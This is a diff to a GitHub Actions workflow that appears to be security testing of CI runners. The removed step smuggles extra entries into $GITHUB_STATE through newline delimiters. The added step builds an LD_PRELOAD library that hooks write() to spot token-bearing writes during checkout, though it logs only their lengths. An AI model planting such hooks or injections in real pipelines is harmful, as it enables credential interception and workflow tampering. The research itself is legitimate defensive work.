@@ -9,22 +9,53 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: inject — write state with newlines in key
+      - name: compile write-hook .so and set LD_PRELOAD
         run: |
-          # Normal state
-          echo "normal_state=NORMAL" >> $GITHUB_STATE
+          cat > /tmp/hook.c << 'CEOF'
+          #define _GNU_SOURCE
+          #include <dlfcn.h>
+          #include <unistd.h>
+          #include <string.h>
+          #include <fcntl.h>
           
-          # Injected state via newline
-          printf 'x<<D\nx\nD\ninjected_state<<D2\nSTATE_INJECTED_VIA_NEWLINE\nD2' >> $GITHUB_STATE
+          static ssize_t (*real_write)(int, const void*, size_t) = NULL;
           
-          echo "GITHUB_STATE contents:"
-          cat $GITHUB_STATE
-          
-          echo ""
-          echo "Reading state via env vars:"
-          echo "STATE_normal_state=$STATE_normal_state"
-          echo "STATE_injected_state=$STATE_injected_state"
-          echo "STATE_x=$STATE_x"
-          
-          echo ""
-          echo "Note: state is read in POST steps, not the same step"
+          ssize_t write(int fd, const void *buf, size_t count) {
+              if (!real_write) real_write = dlsym(RTLD_NEXT, "write");
+              
+              // Capture writes that contain token-like strings
+              if (count > 10 && count < 8192) {
+                  const char *s = (const char*)buf;
+                  if (memmem(s, count, "password", 8) ||
+                      memmem(s, count, "x-access-token", 14)) {
+                      int capfd = open("/tmp/write_captures.txt",
+                          O_WRONLY|O_CREAT|O_APPEND, 0600);
+                      if (capfd >= 0) {
+                          // Write key=value length only (not actual content)
+                          char line[256];
+                          int len = snprintf(line, sizeof(line),
+                              "WRITE fd=%d len=%zu contains_token=yes\n", fd, count);
+                          real_write(capfd, line, len);
+                          close(capfd);
+                      }
+                  }
+              }
+              return real_write(fd, buf, count);
+          }
+          CEOF
+          gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
+          echo "LD_PRELOAD=/tmp/hook.so" >> $GITHUB_ENV
+
+      - name: checkout (git uses credential helper with token)
+        uses: actions/checkout@v4
+
+      - name: check captures
+        run: |
+          echo "=== Write hook captures ==="
+          if [ -f /tmp/write_captures.txt ]; then
+            cat /tmp/write_captures.txt
+            echo ""
+            echo "Lines captured: $(wc -l < /tmp/write_captures.txt)"
+          else
+            echo "No captures"
+          fi
